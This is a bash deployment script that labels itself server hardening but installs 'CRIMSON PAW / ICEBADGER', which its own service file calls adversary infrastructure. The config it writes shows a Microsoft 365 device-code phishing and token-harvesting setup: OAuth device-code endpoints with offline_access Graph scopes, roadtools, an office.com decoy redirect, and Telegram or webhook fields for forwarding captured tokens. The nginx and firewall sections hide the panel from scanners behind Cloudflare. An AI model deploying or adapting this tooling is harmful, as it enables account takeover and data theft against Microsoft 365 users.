#!/usr/bin/env bash
# ==============================================================================
# CRIMSON PAW / ICEBADGER - Automated Production Staging & Hardening Script
# Target OS: Ubuntu 20.04 / 22.04 / 24.04 LTS & Debian 11 / 12
# Purpose: 1-Click Server Hardening, Cloudflare UFW Shield, Nginx Proxy, Systemd
# ==============================================================================

set -e

# Color Palette
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

echo -e "${RED}${BOLD}"
cat << "EOF"
  ██████╗██████╗ ██╗███╗   ███╗███████╗ ██████╗ ███╗   ██╗    ██████╗  █████╗ ██╗    ██╗
 ██╔════╝██╔══██╗██║████╗ ████║██╔════╝██╔═══██╗████╗  ██║    ██╔══██╗██╔══██╗██║    ██║
 ██║     ██████╔╝██║██╔████╔██║███████╗██║   ██║██╔██╗ ██║    ██████╔╝███████║██║ █╗ ██║
 ██║     ██╔══██╗██║██║╚██╔╝██║╚════██║██║   ██║██║╚██╗██║    ██╔═══╝ ██╔══██║██║███╗██║
 ╚██████╗██║  ██║██║██║ ╚═╝ ██║███████║╚██████╔╝██║ ╚████║    ██║     ██║  ██║╚███╔███╔╝
  ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ 
EOF
echo -e "${NC}"
echo -e "${CYAN}${BOLD}[*] Starting 1-Click Server Hardening & Production Deployment${NC}"
echo -e "${CYAN}[*] Target Host Architecture: Ubuntu / Debian Linux with Cloudflare Edge Shield${NC}\n"

# 1. Root Verification
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[ERROR] This deployment script must be run as root (use sudo or login as root).${NC}"
   exit 1
fi

INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$INSTALL_DIR"

echo -e "${BLUE}[1/8] Deploying in current directory: ${INSTALL_DIR}...${NC}"

# Ensure auxiliary folders exist
mkdir -p "$INSTALL_DIR/audit_assets"
mkdir -p "$INSTALL_DIR/scratch"
mkdir -p "/opt/crimsonpaw_backups"

# 2. Update System Packages & Install OS Dependencies
echo -e "${BLUE}[2/8] Installing core system packages and build tools...${NC}"
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y --no-install-recommends \
    python3 \
    python3-pip \
    python3-venv \
    python3-dev \
    build-essential \
    ufw \
    nginx \
    curl \
    wget \
    jq \
    fail2ban \
    sqlite3 \
    git \
    certbot \
    python3-certbot-nginx

# 3. Python Virtual Environment Setup
echo -e "${BLUE}[3/8] Setting up Python 3 virtual environment...${NC}"
if [[ ! -d "$INSTALL_DIR/venv" ]]; then
    python3 -m venv "$INSTALL_DIR/venv"
fi

"$INSTALL_DIR/venv/bin/pip" install --upgrade pip setuptools wheel
if [[ -f "$INSTALL_DIR/requirements.txt" ]]; then
    "$INSTALL_DIR/venv/bin/pip" install -r "$INSTALL_DIR/requirements.txt" gunicorn
else
    "$INSTALL_DIR/venv/bin/pip" install Flask requests python-dotenv roadtools google-genai gunicorn
fi

# 4. Configuration & Environment Initialization
echo -e "${BLUE}[4/8] Initializing environment files & settings...${NC}"
if [[ ! -f "$INSTALL_DIR/.env" ]]; then
    if [[ -f "$INSTALL_DIR/.env.example" ]]; then
        cp "$INSTALL_DIR/.env.example" "$INSTALL_DIR/.env"
        echo -e "${YELLOW}[!] Created .env from .env.example. Review credentials if needed.${NC}"
    else
        cat << 'EOF' > "$INSTALL_DIR/.env"
ICEBADGER_DB_PATH=icebadger.db
ICEBADGER_CLIENT_ID=29d9ed98-a469-4536-ade2-f981bc1d605e
ICEBADGER_TENANT_ID=common
ICEBADGER_DEVICE_CODE_URL=https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
ICEBADGER_TOKEN_URL=https://login.microsoftonline.com/common/oauth2/v2.0/token
ICEBADGER_SCOPES=https://graph.microsoft.com/.default openid profile offline_access
ICEBADGER_POLL_INTERVAL=5
ICEBADGER_MAX_RETRIES=3
ICEBADGER_RETRY_DELAY=5.0
ICEBADGER_LOG_LEVEL=INFO
ICEBADGER_WEB_HOST=0.0.0.0
ICEBADGER_WEB_PORT=5000
GEMINI_API_KEY=
EOF
        echo -e "${GREEN}[✓] Generated clean default .env file.${NC}"
    fi
fi

if [[ ! -f "$INSTALL_DIR/settings.json" ]]; then
    cat << 'EOF' > "$INSTALL_DIR/settings.json"
{
    "platform_name": "CRIMSON PAW",
    "default_redirect": "https://www.office.com/",
    "deploy_host": "http://127.0.0.1:5000",
    "refresh_threshold": 10,
    "nc_user": "",
    "nc_key": "",
    "nc_ip": "",
    "nc_env": "production",
    "tg_bot_token": "",
    "tg_chat_id": "",
    "webhook_url": "",
    "notify_token": true,
    "kwa_tg_bot_token": "",
    "kwa_tg_chat_id": "",
    "kwa_tg_enabled": false,
    "admin_password": "Sysadmin",
    "two_factor_method": "disabled",
    "two_factor_enforcement": "disabled",
    "two_factor_pin": "",
    "client_admin_locked": false
}
EOF
    echo -e "${GREEN}[✓] Generated initial settings.json (Admin password: Sysadmin).${NC}"
else
    # Ensure client_admin_locked is false on fresh server setup so user isn't locked out
    if grep -q '"client_admin_locked": true' "$INSTALL_DIR/settings.json"; then
        sed -i 's/"client_admin_locked": true/"client_admin_locked": false/' "$INSTALL_DIR/settings.json"
        echo -e "${YELLOW}[!] Reset client_admin_locked to false in settings.json to ensure admin login.${NC}"
    fi
fi

# 5. Cloudflare Real IP Restoration in Nginx
echo -e "${BLUE}[5/8] Fetching Cloudflare edge CIDRs for Real-IP restoration...${NC}"
CF_REAL_IP_CONF="/etc/nginx/conf.d/cloudflare_real_ip.conf"
cat << 'EOF' > "$CF_REAL_IP_CONF"
# Cloudflare Official Real IP Configuration
# Dynamically pulls real visitor IPs from CF-Connecting-IP header
EOF

CF_V4=$(curl -s --max-time 10 https://www.cloudflare.com/ips-v4 || true)
CF_V6=$(curl -s --max-time 10 https://www.cloudflare.com/ips-v6 || true)

if [[ -n "$CF_V4" ]]; then
    for cidr in $CF_V4; do
        echo "set_real_ip_from $cidr;" >> "$CF_REAL_IP_CONF"
    done
else
    # Fallback to standard Cloudflare ranges if offline during install
    cat << 'EOF' >> "$CF_REAL_IP_CONF"
set_real_ip_from 173.245.48.0/20;
set_real_ip_from 103.21.244.0/22;
set_real_ip_from 103.22.200.0/22;
set_real_ip_from 103.31.4.0/22;
set_real_ip_from 141.101.64.0/18;
set_real_ip_from 108.162.192.0/18;
set_real_ip_from 190.93.240.0/20;
set_real_ip_from 188.114.96.0/20;
set_real_ip_from 197.234.240.0/22;
set_real_ip_from 198.41.128.0/17;
set_real_ip_from 162.158.0.0/15;
set_real_ip_from 104.16.0.0/13;
set_real_ip_from 104.24.0.0/14;
set_real_ip_from 172.64.0.0/13;
set_real_ip_from 131.0.72.0/22;
EOF
fi

if [[ -n "$CF_V6" ]]; then
    for cidr6 in $CF_V6; do
        echo "set_real_ip_from $cidr6;" >> "$CF_REAL_IP_CONF"
    done
fi

cat << 'EOF' >> "$CF_REAL_IP_CONF"
real_ip_header CF-Connecting-IP;
real_ip_recursive on;
EOF
echo -e "${GREEN}[✓] Cloudflare Real-IP module configured.${NC}"

# 6. Configure Nginx Reverse Proxy with Direct-to-IP Shield (HTTP 444)
echo -e "${BLUE}[6/8] Configuring Nginx reverse proxy & scanner shield...${NC}"
cat << 'EOF' > /etc/nginx/sites-available/icebadger
# Direct-to-IP Scanner Shield: Drops raw IP bots and port scanners immediately
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    # HTTP 444 closes connection silently without returning HTTP headers or data
    return 444;
}

# Production Multi-Domain Reverse Proxy for Cloudflare
server {
    listen 80;
    listen [::]:80;
    
    # Matches any custom domain or subdomain forwarded via Cloudflare
    server_name ~^(?<domain>.+)$;

    client_max_body_size 50M;

    # Security Headers
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_http_version 1.1;

        # WebSocket & Long-Polling Connection support
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";

        # Forward Genuine Client Headers
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header CF-Connecting-IP $http_cf_connecting_ip;
        proxy_set_header CF-IPCountry $http_cf_ipcountry;

        proxy_read_timeout 180s;
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
    }
}
EOF

# Enable site and remove default
ln -sf /etc/nginx/sites-available/icebadger /etc/nginx/sites-enabled/icebadger
rm -f /etc/nginx/sites-enabled/default

# Test Nginx syntax
nginx -t
systemctl restart nginx

# 7. Configure Cloudflare UFW Firewall Shield
echo -e "${BLUE}[7/8] Configuring UFW Firewall Shield...${NC}"
# Allow SSH first so user is never locked out
ufw allow 22/tcp comment 'SSH Access'

# Whitelist Cloudflare IPv4 ranges for ports 80/443
if [[ -n "$CF_V4" ]]; then
    for cidr in $CF_V4; do
        ufw allow proto tcp from "$cidr" to any port 80,443 comment 'Cloudflare IPv4' >/dev/null 2>&1 || true
    done
fi

# Whitelist Cloudflare IPv6 ranges for ports 80/443
if [[ -n "$CF_V6" ]]; then
    for cidr6 in $CF_V6; do
        ufw allow proto tcp from "$cidr6" to any port 80,443 comment 'Cloudflare IPv6' >/dev/null 2>&1 || true
    done
fi

# Also allow loopback
ufw allow in on lo >/dev/null 2>&1 || true

# Set defaults & enable UFW non-interactively
ufw default deny incoming >/dev/null 2>&1 || true
ufw default allow outgoing >/dev/null 2>&1 || true
echo "y" | ufw enable >/dev/null 2>&1 || true
echo -e "${GREEN}[✓] UFW Firewall active: Port 22 open for SSH; Ports 80/443 shielded exclusively for Cloudflare.${NC}"

# 8. Systemd Background Daemon Setup
echo -e "${BLUE}[8/8] Installing production systemd service (crimsonpaw.service)...${NC}"
cat << EOF > /etc/systemd/system/crimsonpaw.service
[Unit]
Description=CRIMSON PAW Advanced Adversary Infrastructure
After=network.target nginx.service

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
Environment="PATH=$INSTALL_DIR/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
ExecStart=$INSTALL_DIR/venv/bin/python3 main.py
Restart=always
RestartSec=3
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
Alias=icebadger.service
EOF

# Provide symlink for icebadger.service compatibility
ln -sf /etc/systemd/system/crimsonpaw.service /etc/systemd/system/icebadger.service

systemctl daemon-reload
systemctl enable crimsonpaw
systemctl restart crimsonpaw

# 9. Health & Verification Check
sleep 3
SERVER_IP=$(curl -s --max-time 3 https://api.ipify.org || hostname -I | awk '{print $1}')

echo -e "\n${GREEN}${BOLD}==============================================================================${NC}"
echo -e "${GREEN}${BOLD}             🐾 CRIMSON PAW DEPLOYMENT COMPLETED SUCCESSFULLY!                ${NC}"
echo -e "${GREEN}${BOLD}==============================================================================${NC}\n"

echo -e "${BOLD}Current Service Status:${NC}"
systemctl is-active crimsonpaw >/dev/null 2>&1 && echo -e "  ● Service Daemon:    ${GREEN}ACTIVE (RUNNING)${NC}" || echo -e "  ● Service Daemon:    ${RED}FAILED (Inspect logs)${NC}"
systemctl is-active nginx >/dev/null 2>&1 && echo -e "  ● Nginx Edge Proxy:  ${GREEN}ACTIVE (RUNNING)${NC}" || echo -e "  ● Nginx Edge Proxy:  ${RED}FAILED (Inspect logs)${NC}"
echo -e "  ● Server Public IP:  ${CYAN}${SERVER_IP}${NC}"
echo -e "  ● Install Directory: ${CYAN}${INSTALL_DIR}${NC}\n"

echo -e "${BOLD}Cloudflare Configuration Checklist:${NC}"
echo -e "  1. In Cloudflare DNS, set an ${YELLOW}A Record${NC} for your domain pointing to ${CYAN}${SERVER_IP}${NC} with ${YELLOW}Proxy Status: Proxied (Orange Cloud)${NC}."
echo -e "  2. Under Cloudflare ${YELLOW}SSL/TLS${NC}, select ${GREEN}Flexible${NC} (or ${GREEN}Full${NC} if using Origin CA)."
echo -e "  3. Access your operator admin panel at: ${GREEN}http://yourdomain.com/${NC} or ${GREEN}https://yourdomain.com/${NC}"
echo -e "     Default Admin Password: ${YELLOW}Sysadmin${NC}\n"

echo -e "${BOLD}Useful Operator Commands:${NC}"
echo -e "  ● View live logs:     ${CYAN}journalctl -u crimsonpaw -f${NC}"
echo -e "  ● Restart service:    ${CYAN}systemctl restart crimsonpaw${NC}"
echo -e "  ● Check service:      ${CYAN}systemctl status crimsonpaw${NC}"
echo -e "  ● View error logs:    ${CYAN}journalctl -u crimsonpaw -e --no-pager -n 50${NC}\n"
